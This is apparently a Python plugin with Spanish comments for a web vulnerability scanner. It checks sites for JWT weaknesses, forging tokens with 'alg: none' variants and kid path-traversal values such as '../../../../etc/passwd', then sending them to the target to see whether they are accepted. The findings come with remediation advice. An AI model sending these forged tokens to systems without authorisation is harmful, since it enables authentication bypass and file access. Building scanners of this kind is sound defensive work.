"""
plugins/dast/jwt_attacks.py — Plugin de Ataques JWT

Detecta vulnerabilidades JWT: algoritmo none, HMAC débil,
JWK header injection, KID path traversal, y expiración.

Categoría OWASP: A07:2021 — Identification and Authentication Failures
CWE: CWE-345 (Insufficient Verification of Data Authenticity)
"""

import base64
import json
import re
from urllib.parse import urlparse
from core.interfaces import BasePlugin
from core.logger import get_logger
from core.modelos import CategoriaOWASP, Confianza, Hallazgo, Severidad

logger = get_logger("jwt_attacks")

_PATRON_JWT = re.compile(r'(eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)', re.DOTALL)


class JWTToolkit:
    @staticmethod
    def decode_segment(seg: str) -> dict:
        padded = seg + "=" * (4 - len(seg) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(padded))
        except Exception:
            return {}

    @staticmethod
    def encode_segment(data: dict) -> str:
        raw = json.dumps(data, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

    @staticmethod
    def extraer_jwts(texto: str) -> list[str]:
        return _PATRON_JWT.findall(texto)


class JWTAtaquePlugin(BasePlugin):

    @property
    def nombre(self) -> str:
        return "JWT Attack Scanner"

    @property
    def categoria_owasp(self) -> CategoriaOWASP:
        return CategoriaOWASP.A07_AUTH_FAILURES

    @property
    def severidad_maxima(self) -> Severidad:
        return Severidad.CRITICA

    def ejecutar(self, target_url: str, http_client, metadata: dict) -> list[Hallazgo]:
        hallazgos = []

        jwts = self._recolectar_jwts(http_client, metadata, target_url)
        if not jwts:
            logger.info("No se encontraron JWT tokens para analizar.")
            return hallazgos

        logger.info(f"JWT tokens encontrados: {len(jwts)}")

        for token in set(jwts):
            hallazgos.extend(self._analizar_jwt(token, http_client, target_url))

        # Probar ataques de algoritmo none
        if jwts:
            token = jwts[0]
            parts = token.split(".")
            if len(parts) == 3:
                header = JWTToolkit.decode_segment(parts[0])
                payload = JWTToolkit.decode_segment(parts[1])
                hallazgos.extend(self._probar_alg_none(header, payload, http_client, target_url))
                hallazgos.extend(self._probar_kid_traversal(header, payload, http_client, target_url))

        return hallazgos

    def _recolectar_jwts(self, http_client, metadata: dict, target_url: str) -> list[str]:
        jwts = []

        # De headers de respuesta
        response = http_client.get(target_url)
        if response:
            auth_header = response.headers.get("Authorization", "")
            if auth_header.startswith("Bearer "):
                jwts.append(auth_header[7:])
            cookie = response.headers.get("Set-Cookie", "")
            for match in _PATRON_JWT.findall(cookie):
                jwts.append(match)

        # De archivos JS
        for js_url in metadata.get("archivos_js", []):
            resp = http_client.get(js_url)
            if resp:
                for match in _PATRON_JWT.findall(resp.text):
                    jwts.append(match)

        # De páginas HTML
        for url in metadata.get("urls_descubiertas", [])[:20]:
            resp = http_client.get(url)
            if resp:
                for match in _PATRON_JWT.findall(resp.text):
                    jwts.append(match)

        return jwts

    def _analizar_jwt(self, token: str, http_client, target_url: str) -> list[Hallazgo]:
        hallazgos = []
        parts = token.split(".")
        if len(parts) != 3:
            return hallazgos

        header = JWTToolkit.decode_segment(parts[0])
        payload = JWTToolkit.decode_segment(parts[1])

        if not header:
            return hallazgos

        alg = header.get("alg", "")

        # Verificar expiración
        exp = payload.get("exp", 0)
        import time
        if exp and exp < time.time():
            hallazgos.append(Hallazgo(
                plugin_nombre=self.nombre,
                categoria_owasp=self.categoria_owasp,
                severidad=Severidad.MEDIA,
                confianza=Confianza.CONFIRMADA,
                url_afectada=target_url,
                parametro="JWT:exp",
                metodo_http="GET",
                payload_usado="",
                evidencia=f"JWT token expirado reutilizado — exp: {exp}, ahora: {int(time.time())}",
                cwe_id="CWE-613",
                remediacion="Los tokens expirados deben ser rechazados. Validar el claim 'exp' en el servidor.",
            ))

        # Verificar if jwt kid path traversal
        kid = header.get("kid", "")
        if "../" in kid or "..\\" in kid:
            hallazgos.append(Hallazgo(
                plugin_nombre=self.nombre,
                categoria_owasp=self.categoria_owasp,
                severidad=Severidad.CRITICA,
                confianza=Confianza.CONFIRMADA,
                url_afectada=target_url,
                parametro="JWT:kid",
                metodo_http="GET",
                payload_usado=kid,
                evidencia=f"KID path traversal detectado en JWT header: {kid}",
                cwe_id="CWE-22",
                remediacion="Validar y sanitizar el valor de 'kid'. No usarlo directamente para leer archivos.",
            ))

        return hallazgos

    def _probar_alg_none(self, header: dict, payload: dict, http_client, target_url) -> list[Hallazgo]:
        hallazgos = []

        for fake_alg in ["none", "None", "NONE", "nOnE"]:
            fake_header = {**header, "alg": fake_alg}
            fake_token = f"{JWTToolkit.encode_segment(fake_header)}.{JWTToolkit.encode_segment(payload)}."

            response = http_client.get(target_url, headers={"Authorization": f"Bearer {fake_token}"})
            if response and response.status_code not in (401, 403, 500):
                hallazgos.append(Hallazgo(
                    plugin_nombre=self.nombre,
                    categoria_owasp=self.categoria_owasp,
                    severidad=Severidad.CRITICA,
                    confianza=Confianza.CONFIRMADA,
                    url_afectada=target_url,
                    parametro="JWT:alg=none",
                    metodo_http="GET",
                    payload_usado=fake_token[:60],
                    evidencia=f"JWT alg={fake_alg} aceptado — HTTP {response.status_code}",
                    cwe_id="CWE-345",
                    remediacion="Rechazar tokens con algoritmo 'none'. Validar que el algoritmo del header coincida con el esperado.",
                ))
                logger.warning(f"  🔴 JWT alg={fake_alg} aceptado!")
                break

        return hallazgos

    def _probar_kid_traversal(self, header: dict, payload: dict, http_client, target_url) -> list[Hallazgo]:
        hallazgos = []
        kid_original = header.get("kid", "")
        if not kid_original:
            return hallazgos

        for traversal in ["../../../../dev/null", "/dev/null", "../../../../etc/passwd"]:
            fake_header = {**header, "kid": traversal}
            fake_token = f"{JWTToolkit.encode_segment(fake_header)}.{JWTToolkit.encode_segment(payload)}.firmafalsa"

            response = http_client.get(target_url, headers={"Authorization": f"Bearer {fake_token}"})
            if response and response.status_code not in (401, 403, 500):
                hallazgos.append(Hallazgo(
                    plugin_nombre=self.nombre,
                    categoria_owasp=self.categoria_owasp,
                    severidad=Severidad.ALTA,
                    confianza=Confianza.TENTATIVA,
                    url_afectada=target_url,
                    parametro="JWT:kid",
                    metodo_http="GET",
                    payload_usado=traversal,
                    evidencia=f"Posible KID path traversal — HTTP {response.status_code}",
                    cwe_id="CWE-22",
                    remediacion="Validar que 'kid' no contenga caracteres de path traversal. Restringir la ruta de búsqueda de claves.",
                ))
                break

        return hallazgos
